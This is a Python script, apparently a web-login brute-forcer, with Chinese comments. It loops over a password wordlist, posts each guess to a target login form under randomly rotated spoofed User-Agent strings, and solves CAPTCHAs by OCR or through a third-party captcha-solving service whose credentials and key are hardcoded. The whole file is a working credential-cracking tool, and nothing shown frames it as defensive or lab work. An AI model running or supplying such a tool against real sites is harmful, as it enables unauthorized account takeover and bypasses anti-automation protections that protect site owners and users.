import requests,pytesseract,argparse,time,random,os,re
from ctypes import *
from urllib import request
from PIL import Image
from http import cookiejar

username = None
target = None
passfile = None
codesrc = None
cookies = ''
key = None
# 参数获取
def sys_args():
    global username
    global passfile
    global target
    global codesrc
    global key

    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--user",help="username")
    parser.add_argument("-p","--passfile",help="passfile")
    parser.add_argument("-t","--target",help="target website")
    parser.add_argument("-c","--codesrc",help="code src")
    parser.add_argument("-k", "--key", help="",action="store_true",default=False)
    args = parser.parse_args()

    username = args.user
    passfile = args.passfile
    target = args.target
    codesrc = args.codesrc
    key = args.key
    if username != None and passfile != None:
        read_wordlist()

# 发送post请求
def request_post(password):
    # 获取cookie
    user_agent = [
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
        "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
        "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
        "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
        "Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
        "Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10",
        "Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
        "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
        "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0",
        "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)",
        "UCWEB7.0.2.37/28/999",
        "NOKIA5700/ UCWEB7.0.2.37/28/999",
        "Openwave/ UCWEB7.0.2.37/28/999",
        "Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999",
        "Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25"
    ]
    # 获取验证码
    if codesrc != None:
        code = read_code(codesrc)
    headers = {'User-Agent': random.choice(user_agent),
               "Referer": target,
               "Content-Type": "application/x-www-form-urlencoded",
               "Cookie": cookies,
               }

    # 需要更改抓取post数据
    data = {
        'username': username,
        'password': password,
        'vcode': code,
        'submit': 'Login'
    }
    print("[*] Start brute web-login user:%s|password:%s" %(username,password))
    res = requests.post(target, data=data,headers=headers)
    # print(res.content.decode("utf-8"))
    # 随机延迟
    #i = random.randint(1,2 )
    #time.sleep(i)
    # 错误提示
    result = res.content.decode("utf-8")

    if re.findall(r'验证码输入错误哦！',result):
        pass
    else:
        print("[+]Cracked successed ! password=%s" %password)

# 读取字典
def read_wordlist():

    with open(passfile,"r") as f:
        passwords = f.readlines()

    for password in passwords:
        request_post(password)

# 识别验证码
def read_code(codesrc):
    global cookies
    cookie = cookiejar.CookieJar()
    handler = request.HTTPCookieProcessor(cookie)
    opener = request.build_opener(handler)
    resp = opener.open(codesrc)

    # 拼接cookie
    cookies = ''
    for item in cookie:
        cookies = cookies + item.name + '=' + item.value + ';'
    #while True:
    request.urlretrieve(codesrc, 'captcha.jpg')
    image = Image.open('captcha.jpg')

    YDMApi = windll.LoadLibrary('yundamaAPI-x64')
    # 分配30个字节存放识别结果
    result = c_char_p(b"                              ")
    # 一键识别函数，无需调用 YDM_SetAppInfo 和 YDM_Login，适合脚本调用
    if key == True:
        captchaId = YDMApi.YDM_EasyDecodeByPath(b'defcon_test', b'defcon_test', 8216, b'5c184ea9797bf352f85f5a3a86187dbb',
                                                b'captcha.jpg', 1006, 60, result)
        code = result.value
    else:
        code = pytesseract.image_to_string(image)
    return code

if __name__ == '__main__':
    sys_args()